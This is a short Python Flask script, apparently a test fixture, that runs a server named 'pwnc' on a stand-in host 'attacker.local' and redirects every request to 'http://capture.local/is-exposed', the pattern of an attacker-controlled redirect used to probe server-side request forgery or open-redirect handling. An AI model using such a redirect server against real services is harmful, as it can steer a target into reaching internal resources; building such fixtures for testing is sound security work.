from flask import Flask, redirect

app = Flask("pwnc")


@app.route("/")
def hello():
    return redirect("http://capture.local/is-exposed")


app.run("attacker.local", 9999)
